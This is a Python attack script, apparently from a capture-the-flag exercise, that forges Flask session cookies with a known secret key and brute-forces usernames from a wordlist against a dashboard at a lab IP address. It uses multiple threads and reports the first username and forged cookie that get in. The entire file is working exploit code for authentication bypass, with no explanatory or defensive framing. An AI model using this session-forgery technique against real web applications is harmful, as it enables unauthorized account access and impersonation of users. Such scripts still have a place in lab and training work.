#!/usr/bin/python3
import requests
from flask_unsign import session
from pwn import log
from concurrent.futures import ThreadPoolExecutor, as_completed

# Target
url = "http://10.10.11.160:5000/dashboard"

# Set Threads
THREADS: int = 15

# Logs
p1 = log.progress("Bruteforcing user")

# Known secret key
secret_key = "secret123"

# Usernames file
with open("/usr/share/seclists/Usernames/Names/names.txt", "r") as f:
    usernames = [line.strip() for line in f if line.strip()]

# Worker function for each username
def test_username(user):
    try:
        # Create session data
        data = {"logged_in": True, "username": user}
        cookie = session.sign(data, secret=secret_key)

        # Send request
        cookies = {"session": cookie}
        r = requests.get(url, cookies=cookies, timeout=5)

        return user, cookie, r.status_code, len(r.text), r.text
    except Exception as e:
        return user, None, None, None, str(e)

found = False

# Use thread pool
with ThreadPoolExecutor(max_workers=THREADS) as executor: 
    futures = {executor.submit(test_username, user): user for user in usernames}

    for future in as_completed(futures):
        user, cookie, status, length, text = future.result()
        p1.status(f"{user} -> {status}, len={length}")

        if text and (length != 1967 or "Welcome" in text):
            found = True
            p1.success(f"Username found {user}")
            log.success(f"Cookie: {cookie}")
            log.success(f"Status={status}, Length={length}")
            # Stop the rest of the threads
            for f in futures:
                f.cancel()
            executor.shutdown(wait=False, cancel_futures=True)
            break  # stop once a hit is found

if not found:
    p1.failure("No user could be found")
